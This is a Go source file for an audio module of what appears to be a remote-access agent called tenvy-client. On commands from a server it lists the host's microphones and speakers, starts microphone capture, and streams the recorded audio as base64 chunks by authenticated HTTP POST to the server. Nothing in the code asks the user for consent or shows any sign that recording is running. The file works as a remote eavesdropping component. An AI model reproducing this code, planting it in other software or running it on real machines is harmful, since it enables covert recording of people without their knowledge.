//go:build cgo
// +build cgo

package audio

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"unsafe"

	"github.com/gen2brain/malgo"
	"github.com/rootbay/tenvy-client/internal/protocol"
)

type (
	Command       = protocol.Command
	CommandResult = protocol.CommandResult
)

type Logger interface {
	Printf(format string, args ...interface{})
}

type HTTPDoer interface {
	Do(req *http.Request) (*http.Response, error)
}

type Config struct {
	AgentID   string
	BaseURL   string
	AuthKey   string
	Client    HTTPDoer
	Logger    Logger
	UserAgent string
}

type AudioDirection string

const (
	AudioDirectionInput  AudioDirection = "input"
	AudioDirectionOutput AudioDirection = "output"
)

type AudioDeviceDescriptor struct {
	ID                    string         `json:"id"`
	DeviceID              string         `json:"deviceId"`
	Label                 string         `json:"label"`
	Kind                  AudioDirection `json:"kind"`
	GroupID               string         `json:"groupId"`
	SystemDefault         bool           `json:"systemDefault"`
	CommunicationsDefault bool           `json:"communicationsDefault"`
	LastSeen              string         `json:"lastSeen"`
}

type AudioDeviceInventory struct {
	Inputs     []AudioDeviceDescriptor `json:"inputs"`
	Outputs    []AudioDeviceDescriptor `json:"outputs"`
	CapturedAt string                  `json:"capturedAt"`
	RequestID  string                  `json:"requestId,omitempty"`
}

type AudioStreamFormat struct {
	Encoding   string `json:"encoding"`
	SampleRate int    `json:"sampleRate"`
	Channels   int    `json:"channels"`
}

type AudioStreamChunk struct {
	SessionID string            `json:"sessionId"`
	Sequence  uint64            `json:"sequence"`
	Timestamp string            `json:"timestamp"`
	Format    AudioStreamFormat `json:"format"`
	Data      string            `json:"data"`
}

type AudioControlCommandPayload struct {
	Action      string         `json:"action"`
	RequestID   string         `json:"requestId,omitempty"`
	SessionID   string         `json:"sessionId,omitempty"`
	DeviceID    string         `json:"deviceId,omitempty"`
	DeviceLabel string         `json:"deviceLabel,omitempty"`
	Direction   AudioDirection `json:"direction,omitempty"`
	SampleRate  int            `json:"sampleRate,omitempty"`
	Channels    int            `json:"channels,omitempty"`
	Encoding    string         `json:"encoding,omitempty"`
}

type AudioBridge struct {
	cfg      atomic.Value // stores Config
	mu       sync.Mutex
	sessions map[string]*AudioStreamSession
}

type AudioStreamSession struct {
	bridge     *AudioBridge
	id         string
	deviceID   string
	deviceName string
	direction  AudioDirection
	format     AudioStreamFormat

	ctx    *malgo.AllocatedContext
	device *malgo.Device

	buffers   chan []byte
	runCtx    context.Context
	runCancel context.CancelFunc
	stopped   atomic.Bool
	sequence  uint64

	deviceToken malgo.DeviceID
	useDeviceID bool
	done        chan struct{}
}

func (s *AudioStreamSession) logf(format string, args ...interface{}) {
	if s == nil || s.bridge == nil {
		return
	}
	s.bridge.logf(format, args...)
}

func NewAudioBridge(cfg Config) *AudioBridge {
	bridge := &AudioBridge{
		sessions: make(map[string]*AudioStreamSession),
	}
	bridge.updateConfig(cfg)
	return bridge
}

func (b *AudioBridge) UpdateConfig(cfg Config) {
	if b == nil {
		return
	}
	b.updateConfig(cfg)
}

func (b *AudioBridge) updateConfig(cfg Config) {
	b.cfg.Store(cfg)
}

func (b *AudioBridge) config() Config {
	if value := b.cfg.Load(); value != nil {
		return value.(Config)
	}
	return Config{}
}

func (b *AudioBridge) logf(format string, args ...interface{}) {
	cfg := b.config()
	if cfg.Logger == nil {
		return
	}
	cfg.Logger.Printf(format, args...)
}

func (b *AudioBridge) userAgent() string {
	ua := strings.TrimSpace(b.config().UserAgent)
	if ua != "" {
		return ua
	}
	return "tenvy-client"
}

func (b *AudioBridge) Shutdown() {
	b.mu.Lock()
	sessions := make([]*AudioStreamSession, 0, len(b.sessions))
	for _, session := range b.sessions {
		sessions = append(sessions, session)
	}
	b.sessions = make(map[string]*AudioStreamSession)
	b.mu.Unlock()

	for _, session := range sessions {
		session.stop()
		session.wait(2 * time.Second)
	}
}

func (b *AudioBridge) HandleCommand(ctx context.Context, cmd Command) CommandResult {
	completedAt := time.Now().UTC().Format(time.RFC3339Nano)

	var payload AudioControlCommandPayload
	if len(cmd.Payload) > 0 {
		if err := json.Unmarshal(cmd.Payload, &payload); err != nil {
			return CommandResult{
				CommandID:   cmd.ID,
				Success:     false,
				Error:       fmt.Sprintf("invalid audio control payload: %v", err),
				CompletedAt: completedAt,
			}
		}
	}

	action := strings.TrimSpace(strings.ToLower(payload.Action))
	var err error
	switch action {
	case "enumerate", "inventory":
		err = b.publishInventory(ctx, payload.RequestID)
	case "start":
		err = b.startSession(ctx, payload)
	case "stop":
		err = b.stopSession(payload.SessionID)
	case "":
		err = errors.New("missing audio control action")
	default:
		err = fmt.Errorf("unsupported audio control action: %s", payload.Action)
	}

	if err != nil {
		return CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       err.Error(),
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		}
	}

	return CommandResult{
		CommandID:   cmd.ID,
		Success:     true,
		CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
	}
}

func (b *AudioBridge) publishInventory(ctx context.Context, requestID string) error {
	inventory, err := captureAudioInventory()
	if err != nil {
		return err
	}
	inventory.RequestID = requestID

	data, err := json.Marshal(inventory)
	if err != nil {
		return err
	}

	cfg := b.config()

	baseURL := strings.TrimRight(strings.TrimSpace(cfg.BaseURL), "/")
	if baseURL == "" {
		return errors.New("audio control: missing base URL")
	}
	if cfg.Client == nil {
		return errors.New("audio control: missing http client")
	}

	endpoint := fmt.Sprintf("%s/api/agents/%s/audio/devices", baseURL, url.PathEscape(cfg.AgentID))
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, bytes.NewReader(data))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")
	if ua := strings.TrimSpace(b.userAgent()); ua != "" {
		req.Header.Set("User-Agent", ua)
	}
	if key := strings.TrimSpace(cfg.AuthKey); key != "" {
		req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", key))
	}

	resp, err := cfg.Client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 300 {
		return fmt.Errorf("inventory publish failed: status %d", resp.StatusCode)
	}
	return nil
}

func (b *AudioBridge) startSession(ctx context.Context, payload AudioControlCommandPayload) error {
	sessionID := strings.TrimSpace(payload.SessionID)
	if sessionID == "" {
		return errors.New("audio session identifier is required")
	}

	direction := payload.Direction
	if direction == "" {
		direction = AudioDirectionInput
	}
	if direction != AudioDirectionInput {
		return fmt.Errorf("audio direction %s is not supported", direction)
	}

	channels := payload.Channels
	if channels <= 0 {
		channels = 1
	}
	if channels > 2 {
		channels = 2
	}

	sampleRate := payload.SampleRate
	if sampleRate <= 0 {
		sampleRate = 48000
	}

	encoding := strings.TrimSpace(payload.Encoding)
	if encoding == "" {
		encoding = "pcm16"
	}
	if encoding != "pcm16" {
		return fmt.Errorf("unsupported audio encoding: %s", encoding)
	}

	cfg := b.config()

	if strings.TrimSpace(cfg.BaseURL) == "" {
		return errors.New("audio control: missing base URL")
	}
	if cfg.Client == nil {
		return errors.New("audio control: missing http client")
	}

	session := &AudioStreamSession{
		bridge:     b,
		id:         sessionID,
		deviceID:   strings.TrimSpace(payload.DeviceID),
		deviceName: strings.TrimSpace(payload.DeviceLabel),
		direction:  direction,
		format: AudioStreamFormat{
			Encoding:   encoding,
			SampleRate: sampleRate,
			Channels:   channels,
		},
		buffers: make(chan []byte, 32),
		done:    make(chan struct{}),
	}

	b.mu.Lock()
	if existing, ok := b.sessions[sessionID]; ok {
		b.mu.Unlock()
		existing.stop()
		existing.wait(2 * time.Second)
	} else if len(b.sessions) > 0 {
		for _, active := range b.sessions {
			active.stop()
			go active.wait(2 * time.Second)
		}
		b.sessions = make(map[string]*AudioStreamSession)
		b.mu.Unlock()
	} else {
		b.mu.Unlock()
	}

	allocatedCtx, err := malgo.InitContext(nil, malgo.ContextConfig{}, nil)
	if err != nil {
		return fmt.Errorf("failed to initialize audio context: %w", err)
	}

	deviceConfig := malgo.DefaultDeviceConfig(malgo.Capture)
	deviceConfig.Capture.Format = malgo.FormatS16
	deviceConfig.Capture.Channels = uint32(channels)
	deviceConfig.SampleRate = uint32(sampleRate)
	deviceConfig.Alsa.NoMMap = 1
	deviceConfig.Capture.ShareMode = malgo.Shared

	if session.deviceID != "" {
		token, err := parseDeviceID(session.deviceID)
		if err != nil {
			allocatedCtx.Context.Uninit()
			allocatedCtx.Free()
			return fmt.Errorf("invalid device identifier: %w", err)
		}
		session.deviceToken = token
		session.useDeviceID = true
		deviceConfig.Capture.DeviceID = unsafe.Pointer(&session.deviceToken)
	}

	callbacks := malgo.DeviceCallbacks{
		Data: func(_ []byte, input []byte, _ uint32) {
			session.handleInput(input)
		},
		Stop: func() {
			session.stopped.Store(true)
		},
	}

	device, err := malgo.InitDevice(allocatedCtx.Context, deviceConfig, callbacks)
	if err != nil {
		allocatedCtx.Context.Uninit()
		allocatedCtx.Free()
		return fmt.Errorf("failed to initialize capture device: %w", err)
	}

	if err := device.Start(); err != nil {
		device.Uninit()
		allocatedCtx.Context.Uninit()
		allocatedCtx.Free()
		return fmt.Errorf("failed to start capture device: %w", err)
	}

	session.ctx = allocatedCtx
	session.device = device
	session.runCtx, session.runCancel = context.WithCancel(context.Background())

	go session.run()

	b.mu.Lock()
	b.sessions[session.id] = session
	b.mu.Unlock()

	return nil
}

func (b *AudioBridge) stopSession(sessionID string) error {
	if strings.TrimSpace(sessionID) == "" {
		return errors.New("audio session identifier is required")
	}

	b.mu.Lock()
	session, ok := b.sessions[sessionID]
	if ok {
		delete(b.sessions, sessionID)
	}
	b.mu.Unlock()

	if !ok {
		return nil
	}

	session.stop()
	session.wait(2 * time.Second)
	return nil
}

func (s *AudioStreamSession) handleInput(input []byte) {
	if len(input) == 0 || s.stopped.Load() {
		return
	}

	buffer := make([]byte, len(input))
	copy(buffer, input)

	select {
	case s.buffers <- buffer:
	default:
		select {
		case <-s.buffers:
		default:
		}
		select {
		case s.buffers <- buffer:
		default:
		}
	}
}

func (s *AudioStreamSession) run() {
	defer close(s.done)

	for {
		select {
		case <-s.runCtx.Done():
			return
		case data := <-s.buffers:
			if data == nil || len(data) == 0 {
				continue
			}

			cfg := s.bridge.config()
			baseURL := strings.TrimRight(strings.TrimSpace(cfg.BaseURL), "/")
			if baseURL == "" {
				s.logf("audio stream session %s missing base URL", s.id)
				time.Sleep(500 * time.Millisecond)
				continue
			}
			if cfg.Client == nil {
				s.logf("audio stream session %s missing http client", s.id)
				time.Sleep(500 * time.Millisecond)
				continue
			}

			endpoint := fmt.Sprintf("%s/api/agents/%s/audio/chunks", baseURL, url.PathEscape(cfg.AgentID))

			chunk := AudioStreamChunk{
				SessionID: s.id,
				Sequence:  atomic.AddUint64(&s.sequence, 1),
				Timestamp: time.Now().UTC().Format(time.RFC3339Nano),
				Format:    s.format,
				Data:      base64.StdEncoding.EncodeToString(data),
			}

			if err := s.sendChunk(cfg, endpoint, chunk); err != nil {
				s.logf("audio stream send error: %v", err)
			}
		}
	}
}

func (s *AudioStreamSession) sendChunk(cfg Config, endpoint string, chunk AudioStreamChunk) error {
	payload, err := json.Marshal(chunk)
	if err != nil {
		return err
	}

	sendCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	req, err := http.NewRequestWithContext(sendCtx, http.MethodPost, endpoint, bytes.NewReader(payload))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")
	if ua := strings.TrimSpace(s.bridge.userAgent()); ua != "" {
		req.Header.Set("User-Agent", ua)
	}
	if key := strings.TrimSpace(cfg.AuthKey); key != "" {
		req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", key))
	}

	resp, err := cfg.Client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 300 {
		return fmt.Errorf("audio chunk rejected: status %d", resp.StatusCode)
	}
	return nil
}

func (s *AudioStreamSession) stop() {
	if s == nil {
		return
	}

	if s.stopped.Swap(true) {
		return
	}

	if s.runCancel != nil {
		s.runCancel()
	}

	if s.device != nil {
		_ = s.device.Stop()
		s.device.Uninit()
	}

	if s.ctx != nil {
		_ = s.ctx.Context.Uninit()
		s.ctx.Free()
	}
}

func (s *AudioStreamSession) wait(timeout time.Duration) {
	if s == nil || s.done == nil {
		return
	}
	if timeout <= 0 {
		<-s.done
		return
	}
	select {
	case <-s.done:
	case <-time.After(timeout):
	}
}

func captureAudioInventory() (*AudioDeviceInventory, error) {
	attempts := append([][]malgo.Backend{nil}, fallbackAudioBackendAttempts()...)

	var (
		lastErr       error
		lastInventory *AudioDeviceInventory
	)

	for idx, backends := range attempts {
		ctx, err := malgo.InitContext(backends, malgo.ContextConfig{}, nil)
		if err != nil {
			lastErr = err
			continue
		}

		inventory, err := captureInventoryWithContext(ctx)
		if err != nil {
			lastErr = err
			continue
		}

		lastInventory = inventory
		if len(inventory.Inputs) > 0 || len(inventory.Outputs) > 0 {
			return inventory, nil
		}

		if idx == len(attempts)-1 {
			return inventory, nil
		}
	}

	if lastInventory != nil {
		return lastInventory, nil
	}

	if lastErr != nil {
		return nil, fmt.Errorf("failed to enumerate audio devices: %w", lastErr)
	}

	return nil, errors.New("failed to enumerate audio devices")
}

func captureInventoryWithContext(ctx *malgo.AllocatedContext) (*AudioDeviceInventory, error) {
	if ctx == nil {
		return nil, errors.New("audio context is nil")
	}
	defer func() {
		_ = ctx.Uninit()
		ctx.Free()
	}()

	return enumerateAudioDevices(ctx)
}

func enumerateAudioDevices(ctx *malgo.AllocatedContext) (*AudioDeviceInventory, error) {
	now := time.Now().UTC().Format(time.RFC3339Nano)
	inventory := &AudioDeviceInventory{
		Inputs:     make([]AudioDeviceDescriptor, 0),
		Outputs:    make([]AudioDeviceDescriptor, 0),
		CapturedAt: now,
	}

	var (
		enumerated bool
		lastErr    error
	)

	if playback, err := ctx.Devices(malgo.Playback); err == nil {
		enumerated = true
		for idx, info := range playback {
			label := strings.TrimSpace(info.Name())
			if label == "" {
				label = fmt.Sprintf("Playback %d", idx+1)
			}
			descriptor := AudioDeviceDescriptor{
				ID:                    info.ID.String(),
				DeviceID:              info.ID.String(),
				Label:                 label,
				Kind:                  AudioDirectionOutput,
				GroupID:               "",
				SystemDefault:         info.IsDefault != 0,
				CommunicationsDefault: false,
				LastSeen:              now,
			}
			inventory.Outputs = append(inventory.Outputs, descriptor)
		}
	} else {
		lastErr = fmt.Errorf("failed to enumerate playback devices: %w", err)
	}

	if capture, err := ctx.Devices(malgo.Capture); err == nil {
		enumerated = true
		for idx, info := range capture {
			label := strings.TrimSpace(info.Name())
			if label == "" {
				label = fmt.Sprintf("Microphone %d", idx+1)
			}
			descriptor := AudioDeviceDescriptor{
				ID:                    info.ID.String(),
				DeviceID:              info.ID.String(),
				Label:                 label,
				Kind:                  AudioDirectionInput,
				GroupID:               "",
				SystemDefault:         info.IsDefault != 0,
				CommunicationsDefault: false,
				LastSeen:              now,
			}
			inventory.Inputs = append(inventory.Inputs, descriptor)
		}
	} else {
		lastErr = fmt.Errorf("failed to enumerate capture devices: %w", err)
	}

	if enumerated {
		return inventory, nil
	}

	if lastErr != nil {
		return nil, lastErr
	}

	return inventory, nil
}

func parseDeviceID(value string) (malgo.DeviceID, error) {
	var id malgo.DeviceID
	trimmed := strings.TrimSpace(value)
	if trimmed == "" {
		return id, errors.New("empty device identifier")
	}
	decoded, err := hex.DecodeString(trimmed)
	if err != nil {
		return id, err
	}
	if len(decoded) > len(id) {
		return id, errors.New("device identifier is too long")
	}
	copy(id[:], decoded)
	return id, nil
}
